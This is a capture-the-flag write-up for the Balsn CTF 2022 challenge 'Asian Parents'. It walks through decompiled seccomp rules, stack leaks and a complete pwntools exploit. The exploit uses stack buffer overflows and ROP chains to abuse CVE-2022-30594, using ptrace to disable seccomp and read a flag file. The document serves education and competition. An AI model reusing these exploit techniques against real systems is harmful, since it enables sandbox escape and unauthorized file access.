# Balsn CTF 2022

## Asian Parents 

> The asian parent is ptracing your process.
> Finish orw as fast as you can.
>
> `nc asian-parents.balsnctf.com 7777`
>
> [`dist.zip`](a7c5857ba0899873228cb4658006594e.zip)
>
> [Hint](https://bugs.chromium.org/p/project-zero/issues/detail?id=2276)
>
> Author: paulhuang

Tags: _pwn_ _bof_ _rop_ _x86-64_ _seccomp_ _ptrace_ _cve-2022-30594_


## Summary

The provided hint ([https://bugs.chromium.org/p/project-zero/issues/detail?id=2276](https://bugs.chromium.org/p/project-zero/issues/detail?id=2276)) reduces this problem to understanding the vuln ([CVE-2022-30594](https://www.cve.org/CVERecord?id=CVE-2022-30594)) and exploiting with ROP chains.

The vuln permits disabling seccomp using `ptrace`.  The example in the hint is not dissimilar to the challenge, except we'll have to use leaks and ROP chains vs C code.  IOW, get some leaks, craft ROP chains for the parent and child processes, have the child sleep for a bit so the parent can `syscall` `ptrace`, then ORW (open, read, write) the flag from the child.

Liberal BOFs provide the environment for leaks and our attack.

> This was a fun challenge.  Thanks Paul Huang.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.


### Decompile in Ghidra

> The decompiled code is easy enough to follow in Ghidra.  I'll just included the bits that I used.

#### seccomp rules

```c
void seccomp_child(void)
{
  undefined8 uVar1;
  
  uVar1 = seccomp_init(0x7ff00001);
  seccomp_rule_add(uVar1,0x7fff0000,0,0);
  seccomp_rule_add(uVar1,0x7fff0000,1,0);
  seccomp_rule_add(uVar1,0x7fff0000,0xe6,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x3c,0);
  seccomp_rule_add(uVar1,0x7fff0000,0xe7,0);
  seccomp_load(uVar1);
  return;
}
```

The child process allows the syscalls `read`, `write`, `clock_nanosleep`, `exit`, and `exit_group`.  If you read the hint first it will immediately be obvious why the author gave us the gift of `clock_nanosleep`.

> Wondering if `read` could be used as well to block.

```c
void seccomp_parent(void)
{
  undefined8 uVar1;
  
  uVar1 = seccomp_init(0x7ff00001);
  seccomp_rule_add(uVar1,0x7fff0000,0,0);
  seccomp_rule_add(uVar1,0x7fff0000,1,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x65,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x3d,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x3e,0);
  seccomp_rule_add(uVar1,0x7fff0000,0x3c,0);
  seccomp_rule_add(uVar1,0x7fff0000,0xe7,0);
  seccomp_load(uVar1);
  return;
}
```

The parent process allows the syscalls `read`, `write`, `ptrace`, `wait4`, `kill`, `exit`, and `exit_group`. `ptrace` is core to the CVE.  The `wait4` is a nice to have as well to prevent the parent from exiting before we have the flag.  However, `read` can be used as well to block (what I did at first).

> I found the _order_ of the rules suggestive.

#### BOF

```c
void assign_work(void *param_1)
{
  ssize_t sVar1;
  
  fwrite("Please assign some work to your failure:\n",1,0x29,stdout);
  fwrite(&DAT_0010205a,1,2,stdout);
  sVar1 = read(0,param_1,0x200);
  if (sVar1 == -1) {
    write_and_sync(pipe2child._4_4_,&DAT_0010208d,2);
    byebye();
  }
  else {
    fwrite("Successfully assigned work to your failure!\n",1,0x2c,stdout);
  }
  return;
}

void take_notes(void *param_1)
{
  ssize_t sVar1;
  
  fwrite("Please enter some notes:\n",1,0x19,stdout);
  fwrite(&DAT_0010205a,1,2,stdout);
  sVar1 = read(0,param_1,0x200);
  if (sVar1 == -1) {
    write_and_sync(pipe2child._4_4_,&DAT_0010208d,2);
    byebye();
  }
  else {
    fwrite("Got it!\n",1,8,stdout);
  }
  return;
}
```

`assign_work` and `take_notes` contain the BOF since `main` calling the aforementioned repeatedly uses the same buffer that is `0x98` (`local_98`) bytes from the end of the stack frame.  This can be easily used with `print_work` and `print_notes` to leak all the addresses we need.


#### The Service

```bash
# ./chall
==================================
 Welcome to FAILURE MANAGEMENT!!!
==================================
Please assign some work to your failure:
> foo
Successfully assigned work to your failure!
Current work for your failure: blah

==========================================
  0) Assign other work to your failure
  1) Take notes on managing failure
  2) Read notes on managing failure
  3) Give your failure EMOTIONAL DAMAGE
==========================================
>
```

The service after the initial `Please assign some work ...` loops the above menu.  `0` will have the input and output processed by the child (see the `main` decomp from Ghidra).  `1`/`2` is the same, however from the parent.  `3` will have both processes exit.  Pipes are used for interprocess communication.


#### Leaks

To find the locations of the leaks use GDB/GEF:

```bash
# gef chall
gef➤  b *main+405
Breakpoint 1 at 0x1a84
gef➤  r
Starting program: /pwd/datajerk/balsnctf2022/asian_parents/deploy/asianparent/share/chall
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
==================================
 Welcome to FAILURE MANAGEMENT!!!
==================================
Please assign some work to your failure:
> foo
gef➤  telescope --length 26
0x007fffffffe270│+0x0000: 0x0000000000000000	 ← $rsp
0x007fffffffe278│+0x0008: 0x0000000000000000
0x007fffffffe280│+0x0010: 0x0000000a6f6f66 ("foo\n"?)	 ← $rax, $rdi
0x007fffffffe288│+0x0018: 0x0000000000000000
0x007fffffffe290│+0x0020: 0x0000000000000000
0x007fffffffe298│+0x0028: 0x0000000000000000
0x007fffffffe2a0│+0x0030: 0x0000000000000000
0x007fffffffe2a8│+0x0038: 0x0000000000000000
0x007fffffffe2b0│+0x0040: 0x0000000000000000
0x007fffffffe2b8│+0x0048: 0x0000000000000000
0x007fffffffe2c0│+0x0050: 0x0000000000000000
0x007fffffffe2c8│+0x0058: 0x0000000000000000
0x007fffffffe2d0│+0x0060: 0x0000000000000000
0x007fffffffe2d8│+0x0068: 0x0000000000000000
0x007fffffffe2e0│+0x0070: 0x0000000000000000
0x007fffffffe2e8│+0x0078: 0x0000000000000000
0x007fffffffe2f0│+0x0080: 0x0000000000000000
0x007fffffffe2f8│+0x0088: 0x0000000000000000
0x007fffffffe300│+0x0090: 0x0000000000000000
0x007fffffffe308│+0x0098: 0x84cf629b51950c00
0x007fffffffe310│+0x00a0: 0x0000000000000001	 ← $rbp
0x007fffffffe318│+0x00a8: 0x007ffff7d8bd90  →  <__libc_start_call_main+128> mov edi, eax
0x007fffffffe320│+0x00b0: 0x0000000000000000
0x007fffffffe328│+0x00b8: 0x005555555558ef  →  <main+0> endbr64
0x007fffffffe330│+0x00c0: 0x0000000100000000
0x007fffffffe338│+0x00c8: 0x007fffffffe428  →  0x007fffffffe6a8  →  "/pwd/datajerk/balsnctf2022/asian_parents/deploy/as[...]"
```

> I set the breakpoint just before `memset`--it really does not matter.

The buffer (`local_98`) starts at `+0x0010`; using the stack leak at `+0x00c8` we can compute the address of the beginning of the buffer (we'll be using this as scratch space). libc (for gadgets) is at `+0x00a8`, base process (for the child pid) is at `+0x00b8`, and the canary (for BOF) is at `+0x0098`.

### Attack Plan

1. Leak addresses from the child and/or parent.  We'll take all of them (libc, base, stack, canary).
2. Write out a ROP chain to the child that starts with `sleep(1)`, then ORW the flag.
3. Write out a ROP chain to the parent that calls `ptrace` on the child to disable seccomp to allow the child to `open` the flag, then `wait4` for it ...
4. _Give your failure EMOTIONAL DAMAGE_ (`3`) and retrieve the flag.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) # ubuntu 22.04

if args.REMOTE:
    p = remote('asian-parents.balsnctf.com', 7777)
else:
    p = process(binary.path)
```

Standard pwntools header.  Since the challenge author provided a Docker Compose service, every other thing we need to know is there, e.g. the OS and version of libc, and the location of the flag.


```python
# parent
p.sendlineafter(b'> ',b'foo')

# child: canary leak
p.sendlineafter(b'> ',b'0')
p.sendafter(b'> ',(0x98 - 0x10 + 1) * b'A')
p.recvuntil((0x98 - 0x10 + 1) * b'A')

canary = u64(b'\0' + p.recv(7))
log.info('canary: {x}'.format(x = hex(canary)))

# child: libc leak
p.sendlineafter(b'> ',b'0')
p.sendafter(b'> ',(0x98) * b'A')
p.recvuntil((0x98) * b'A')

libc.address = u64(p.recv(6) + b'\0\0') - 0x29d90 # libc.sym.__libc_start_call_main - 128
log.info('libc.address: {x}'.format(x = hex(libc.address)))
```

> These leaks could have been from the parent or child, dunno why I started with the child process.

Both the canary and libc are your classic _use read without a terminating NULL to get right up to the thing we want to leak, and then emit it_.


```python
# libc gadgets
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rdx_r12 = libc.search(asm('pop rdx; pop r12; ret')).__next__()
xor_r10d = libc.search(asm('xor r10d, r10d; mov eax, r10d; ret')).__next__()
add_r10_rdi_0x20 = libc.search(asm('add r10, qword ptr [rdi + 0x20]; mov rax, r10; ret')).__next__()
pop_rax = libc.search(asm('pop rax; ret')).__next__()
mov_rax_ptr_rax = libc.search(asm('mov rax, qword ptr [rax]; ret')).__next__()
mov_ptr_rdi_rax = libc.search(asm('mov qword ptr [rdi], rax; xor eax, eax; ret')).__next__()
syscall = libc.search(asm('syscall; ret')).__next__()
```

With the location of libc known we can find the locations of the gadgets we'll need.


```python
# parent: binary.address leak
p.sendlineafter(b'> ',b'1')
p.sendafter(b'> ',(0x98 + 0x8 * 2) * b'A')
p.sendlineafter(b'> ',b'2')
p.recvuntil((0x98 + 0x8 * 2) * b'A')
binary.address = u64(p.recv(6) + b'\0\0') - binary.sym.main
log.info('binary.address: {x}'.format(x = hex(binary.address)))

# parent: stack leak
# 0x007ffec31df1a8│+0x00c8: 0x007ffec31df298
p.sendlineafter(b'> ',b'1')
p.sendafter(b'> ',(0x98 + 0x8 * 4) * b'A')
p.sendlineafter(b'> ',b'2')
p.recvuntil((0x98 + 0x8 * 4) * b'A')
buffer  = u64(p.recv(6) + b'\0\0')
buffer -= (0x007ffec31df298 - 0x007ffec31df1a8)
buffer -= (0x98 + 0x8 * 4)
log.info('buffer: {x}'.format(x = hex(buffer)))
```

More leaks.  But this time from the parent.  Again, does not matter.

> Parent leaks require an extra step to emit the leak.


```python
# child: rop chain
payload  = b''
payload += b'/home/asianparent/flag.txt\0'
payload += (0x98 - len(payload) - 0x10) * b'A'
payload += p64(canary)
payload += (0x98 - len(payload)) * b'B'

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(libc.sym.sleep)

payload += p64(pop_rdi)
payload += p64(buffer)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_r12)
payload += 2 * p64(0)
payload += p64(libc.sym.open)

payload += p64(pop_rdi)
payload += p64(buffer + len(payload) + 0x8 * 3)
payload += p64(mov_ptr_rdi_rax)
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(buffer)
payload += p64(pop_rdx_r12)
payload += 2 * p64(100)
payload += p64(pop_rax)
payload += p64(constants.SYS_read)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(constants.SYS_write)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(constants.SYS_exit)
payload += p64(syscall)

assert(len(payload) < 0x200)

p.sendlineafter(b'> ',b'0')
p.sendafter(b'> ',payload)
```

Now that we have the leaks we can construct the child ROP chain.

1. Put the location of the flag in our buffer (now that we know the location) followed by padding to the canary (`local_10` (see the Ghidra decomp)), then the canary, and then pad to end of the stack frame.
2. `sleep(1)`.  `clock_nanosleep` is actually called by `sleep`, so we'll just call the libc function.
3. Assuming the `ptrace` syscall went through from the parent, we should be able to `open` the flag.
4. `read` the flag into our buffer.  This section may look a bit confusing and that is because I didn't want to hardcode `7` for the FD (it was `7` locally, stdin/out/err and the pipes were 0-6), so I opted to use a gadget to "move" `rax` (FD returned from `open`) to `rdi`.  Since there was no obvious `mov rdi, rax` gadget I used a `mov qword ptr [rdi], rax` gadget instead and self-modified my own ROP chain; `0xdeadbeef` becomes the FD returned from `open`.
5. `write` the flag from the buffer.  Profit.
6. `exit` (not always required, but with some CTFs, it helps not loose writes at the end).  It's also the polite thing to do.


```python
# parent: rop chain
PTRACE_SEIZE = 0x4206
PTRACE_O_SUSPEND_SECCOMP = (1 << 21)
PTRACE_O_TRACESECCOMP = 0x00000080

payload  = b''
payload += 0x20 * b'A'
if args.REMOTE:
    payload += p64(PTRACE_O_TRACESECCOMP)
else:
    payload += p64(PTRACE_O_SUSPEND_SECCOMP)
payload += (0x98 - len(payload) - 0x10) * b'B'
payload += p64(canary)
payload += (0x98 - len(payload)) * b'C'

payload += p64(pop_rax)
payload += p64(binary.sym.child)
payload += p64(mov_rax_ptr_rax)
payload += p64(pop_rdi)
payload += p64(buffer + len(payload) + 0x8 * 3)
payload += p64(mov_ptr_rdi_rax)
payload += p64(pop_rsi)
payload += p64(0xdeadbeef)
payload += p64(pop_rdx_r12)
payload += 2 * p64(0)
payload += p64(xor_r10d)
payload += p64(pop_rdi)
payload += p64(buffer)
payload += p64(add_r10_rdi_0x20)
payload += p64(pop_rdi)
payload += p64(PTRACE_SEIZE)
payload += p64(pop_rax)
payload += p64(constants.SYS_ptrace)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(libc.sym.waitpid)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(constants.SYS_exit)
payload += p64(syscall)

assert(len(payload) < 0x200)

p.sendlineafter(b'> ',b'1')
p.sendafter(b'> ',payload)
```

Next the parent ROP chain:

1. Depending on the kernel version either `PTRACE_O_TRACESECCOMP` or `PTRACE_O_SUSPEND_SECCOMP` will need to be used and this needs to be stored in `r10`.  There was no `pop r10` gadget, so I ended up using `xor r10d, r10d` followed by `add r10, qword ptr [rdi + 0x20]`.  To use these gadgets I had `rdi` set to the buffer and the `r10` argument offset `0x20` in.  The rest is padding to the canary and padding to the end of the stack frame.
2. Call `ptrace`, however, we have to dereference `child`.  Using `mov rax, qword ptr [rax]` and then the same trick of self-moding the ROP chain (see child ROP chain) puts the PID of the child into `rsi`.  `r10` is describe in step 1.  All that is left is `rdx` and `rdi` (easy).  `libc.sym.ptrace` did not work for me; using a `syscall` gadget was necessary.
3. `wait` for it ... (the child and the flag).
4. `exit`.


```python
p.sendlineafter(b'> ',b'3')
p.recvuntil(b'effective!\n')
_ = p.recvuntil(b'}').decode()
p.close()
print(_)
```

All that's left is to `3` out of here to execute the chains.  Both will run concurrently, however the `sleep(1)` in the child ROP chain will allow time for the `ptrace` in the parent chain to disable seccomp filters so that child can ORW the flag.

Output:

```bash
# ./exploit.py  REMOTE=1
[+] Opening connection to asian-parents.balsnctf.com on port 7777: Done
[*] canary: 0xdca9078f72303300
[*] libc.address: 0x7f3bc124a000
[*] binary.address: 0x55ed2f619000
[*] buffer: 0x7ffc78a36780
[*] Closed connection to asian-parents.balsnctf.com port 7777
BALSN{4s1an_par3nt5_us3d_7o_0RW_w1th0u7_0p3n_sysca1l}
```

Midway through the competition the challenge author posted on Discord:

> [8:19 AM] paulhuang: Hi all. The timeout for challenge Asian Parents has increased to 30 seconds.

_Why?_

```
# time ./exploit.py REMOTE=1
[+] Opening connection to asian-parents.balsnctf.com on port 7777: Done
[*] canary: 0x537f4e12c4bc0900
[*] libc.address: 0x7f52e8d1e000
[*] binary.address: 0x557fc89cc000
[*] buffer: 0x7ffd18e90fe0
[*] Closed connection to asian-parents.balsnctf.com port 7777
BALSN{4s1an_par3nt5_us3d_7o_0RW_w1th0u7_0p3n_sysca1l}

real	0m4.673s
user	0m1.032s
sys 	0m0.491s
```

Curious about the other solves and if network latency was an issue (I'm almost half a world away).  Locally this took 2.5s.